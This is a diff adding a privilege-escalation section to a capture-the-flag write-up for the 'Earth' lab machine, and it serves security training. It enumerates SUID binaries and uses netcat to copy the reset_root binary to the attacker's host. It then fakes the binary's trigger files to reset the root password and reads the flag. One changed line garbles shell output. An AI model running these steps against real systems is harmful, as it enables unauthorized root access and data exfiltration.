@@ -473,7 +473,7 @@ sh: cannot set terminal process group (830): Inappropriate ioctl for device
 sh: no job control in this shell
 sh-5.1$ whoami
 whoami
-apache
+apache python3 -c 'import pty;pty.spawn("/bin/bash")'
 sh-5.1$
 ```
 
@@ -489,3 +489,275 @@ dumb
 
 We have a pseudo-terminal now(which is dumb).
 
+As we don't have a hint about how to get user access (we just know the username, which should be earth because it is the dir name in */home/*) we can try to escalate directly to root. Attackers often  forget that getting superuser access automatically grants them access to any user account. Of course the most common case is to get user access first and use this access level to escalate to root. In our situation we already have access to an account (apache) and we don't have a clue how to get access to earth user account. It is more logical to try escalating directly to root; if we hit a dead end then we can come back to try again getting user account. If we get root access we save time to get user account access.
+
+### Escalation to root
+
+We have reached the hardest part. Our first try is to search all files in the system and see if any file has the UID or GUID set(SUID/SGID).
+
+```
+bash-5.1$ find / -perm -4000 2>/dev/null
+find / -perm -4000 2>/dev/null
+/usr/bin/chage
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/sudo
+/usr/bin/reset_root
+/usr/sbin/grub2-set-bootflag
+/usr/sbin/pam_timestamp_check
+/usr/sbin/unix_chkpwd
+/usr/sbin/mount.nfs
+/usr/lib/polkit-1/polkit-agent-helper-1
+```
+
+All these files have the UID set. That mean that when executed the linux system executes the as the **owner** of the file and not the account that executes them. For example, when running **sudo* command, it runs as root and not as the user that runs it. From all the above, on file catches our eye: 
+```
+/usr/bin/reset_root
+```
+
+This is a non-standard command. Maybe it is able to reset the root password ? Of course, to be able to do that it must run as root. To whom this file belongs ?
+
+```
+bash-5.1$ ls -l /usr/bin/reset_root
+ls -l /usr/bin/reset_root
+-rwsr-xr-x. 1 root root 24552 Oct 12 22:18 /usr/bin/reset_root
+```
+
+It belongs to root. Perfect. Let's run it.
+
+```
+bash-5.1$ /usr/bin/reset_root
+/usr/bin/reset_root
+CHECKING IF RESET TRIGGERS PRESENT...
+RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
+```
+
+Failed. We somewhat expected this, we knew that things couldn't be that easy. Let's check what kind of file it is. We ''ll be lucky if it is a script file.
+
+
+```
+bash-5.1$ file /usr/bin/reset_root
+file /usr/bin/reset_root
+/usr/bin/reset_root: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4851fddf6958d92a893f3d8042d04270d8d31c23, for GNU/Linux 3.2.0, not stripped
+```
+
+
+Bad luck. It is a binary file. We know that because of the ELF format. That means that we must reverse engineering it just to know what it does exactly. Not an easy job at all.
+
+But wait a minute. the file is not stripped, which means that it contains debug information, symbols and many more. Using *strings* command we can get more info.
+
+```
+bash-5.1$ strings /usr/bin/reset_root
+strings /usr/bin/reset_root
+/lib64/ld-linux-x86-64.so.2
+setuid
+puts
+system
+access
+__libc_start_main
+libc.so.6
+GLIBC_2.2.5
+__gmon_start__
+H=@@@
+paleblueH
+]\UH
+credentiH
+als rootH
+:theEartH
+hisflat
+[]A\A]A^A_
+CHECKING IF RESET TRIGGERS PRESENT...
+RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth
+/usr/bin/echo 'root:Earth' | /usr/sbin/chpasswd
+RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
+;*3$"
+GCC: (GNU) 11.1.1 20210531 (Red Hat 11.1.1-3)
+...
+...
+``` 
+
+Very interesting. The binary file execute library call (puts,system,access). We can also see ASCII strings that maybe printed on condition, like "RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth". **/usr/bin/echo 'root:Earth' | /usr/sbin/chpasswd* is even more revealing, is it shows that password is set to "Earth". We must find what goes wrong and fix it to get this result.
+
+*ltrace* can be used here. This command traces the library calls, so it can hopefully enlighten us of how the program works.
+
+```
+bash-5.1$ ltrace /usr/bin/reset_root                            
+ltrace /usr/bin/reset_root
+bash: ltrace: command not found
+```
+
+Ups! ltrace isn't installed in the system. And we don't have root privileges to install it in the system. Well, not a big deal. We can copy the file and analyze it on our machine. But how to copy? The easiest way is probably to just put it in the public html dir and download it. Let's copy it:
+
+```
+cp /usr/bin/reset_root /var/www/html/
+cp /usr/bin/reset_root /var/www/html/
+cp: cannot create regular file '/var/www/html/reset_root': Permission denied
+```
+
+Well, we don't have write permissions to the public folder. Why not use nc instead? Actually, this is better. We just need to open one more port on our machine for copying. So, on the machien that we own:
+
+```
+$ nc -nvl -p 23457 > reset_root
+listening on [any] 23457 ...
+```
+
+and on target machine:
+
+```
+bash-5.1$ nc 10.0.2.4 23457 < /usr/bin/reset_root                                                                                                                       
+nc 10.0.2.4 23457 < /usr/bin/reset_root
+```
+
+On our machine we see that:
+
+```
+$ nc -nvl -p 23457 > reset_root
+listening on [any] 23457 ...
+connect to [10.0.2.4] from (UNKNOWN) [10.0.2.7] 40304
+$
+```
+
+Everything have gone smoothly:
+
+```
+$ ls -l reset_root
+-rw-r--r-- 1 half half 24552 Mar  1 06:43 reset_root
+$ file reset_root 
+reset_root: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4851fddf6958d92a893f3d8042d04270d8d31c23, for GNU/Linux 3.2.0, not stripped
+```
+
+
+What we have done is to redirect the output of teh file using netcat to a file and not to our terminal. Let's run ltrace on it:
+
+```
+$ ltrace ./reset_root
+bash: ltrace: command not found
+```
+
+I don't have ltrace installed yet, so I am going to install it. This is distro depended. For my machine, because it is Debian, I install and try again:
+
+```
+sudo apt-get update && sudo apt-get install ltrace
+```
+
+After installation I try again.
+
+```
+$ which ltrace
+/usr/bin/ltrace
+$ $ chmod 700 ./reset_root
+$ ltrace ./reset_root
+puts("CHECKING IF RESET TRIGGERS PRESE"...CHECKING IF RESET TRIGGERS PRESENT...
+)                                                                          = 38
+access("/dev/shm/kHgTFI5G", 0)                                                                                       = -1
+access("/dev/shm/Zw7bV9U5", 0)                                                                                       = -1
+access("/tmp/kcM0Wewe", 0)                                                                                           = -1
+puts("RESET FAILED, ALL TRIGGERS ARE N"...RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
+)                                                                          = 44
++++ exited (status 0) +++
+```
+
+I checked if ltrace was successfully installed on my machine, made the ELF file executable and finally run ltrace. The result is what we want. We know that the program executes access in three files and expects to return no error(0). access() is a kernel system call function. We can get more info by using the man page:
+
+```
+$ man 2 access
+ACCESS(2)                                                                       Linux Programmer's Manual                                                                       ACCESS(2)
+
+NAME
+       access, faccessat, faccessat2 - check user's permissions for a file
+...
+...
+DESCRIPTION
+       access() checks whether the calling process can access the file pathname.  If pathname is a symbolic link, it is dereferenced.
+...
+...
+```
+
+If we are able to create this files then we can bypass the checking. So, back on our target machine we execute:
+
+```
+bash-5.1$ touch /dev/shm/kHgTFI5G
+touch /dev/shm/kHgTFI5G
+bash-5.1$ touch /dev/shm/Zw7bV9U5
+touch /dev/shm/Zw7bV9U5
+bash-5.1$ touch /tmp/kcM0Wewe
+touch /tmp/kcM0Wewe
+bash-5.1$ ls /dev/shm/kHgTFI5G               
+ls /dev/shm/kHgTFI5G
+/dev/shm/kHgTFI5G
+bash-5.1$ 
+```
+
+Everything gone as planned. Now is the moment of truth.
+
+```
+bash-5.1$ /usr/bin/reset_root
+/usr/bin/reset_root
+CHECKING IF RESET TRIGGERS PRESENT...
+RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth
+bash-5.1$ su root
+su root
+Password: Earth
+
+[root@earth home]# whoami
+whoami
+root
+[root@earth home]# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+[root@earth home]# 
+```
+
+It worked! We own the machine now.
+
+```
+[root@earth home]# cd
+cd
+[root@earth ~]# ls
+ls
+anaconda-ks.cfg  root_flag.txt
+[root@earth ~]# cat root_flag.txt
+cat root_flag.txt
+
+              _-o#&&*''''?d:>b\_
+          _o/"`''  '',, dMF9MMMMMHo_
+       .o&#'        `"MbHMMMMMMMMMMMHo.
+     .o"" '         vodM*$&&HMMMMMMMMMM?.
+    ,'              $M&ood,~'`(&##MMMMMMH\
+   /               ,MMMMMMM#b?#bobMMMMHMMML
+  &              ?MMMMMMMMMMMMMMMMM7MMM$R*Hk
+ ?$.            :MMMMMMMMMMMMMMMMMMM/HMMM|`*L
+|               |MMMMMMMMMMMMMMMMMMMMbMH'   T,
+$H#:            `*MMMMMMMMMMMMMMMMMMMMb#}'  `?
+]MMH#             ""*""""*#MMMMMMMMMMMMM'    -
+MMMMMb_                   |MMMMMMMMMMMP'     :
+HMMMMMMMHo                 `MMMMMMMMMT       .
+?MMMMMMMMP                  9MMMMMMMM}       -
+-?MMMMMMM                  |MMMMMMMMM?,d-    '
+ :|MMMMMM-                 `MMMMMMMT .M|.   :
+  .9MMM[                    &MMMMM*' `'    .
+   :9MMk                    `MMM#"        -
+     &M}                     `          .-
+      `&.                             .
+        `~,   .                     ./
+            . _                  .-
+              '`--._,dd###pp=""'
+
+Congratulations on completing Earth!
+If you have any feedback please contact me at SirFlash@protonmail.com
+[root_flag_b0da9554d29db2117b02aa8b66ec492e]
+[root@earth ~]#
+```
+
+### Back to user flag
+
+
+### Conclusion
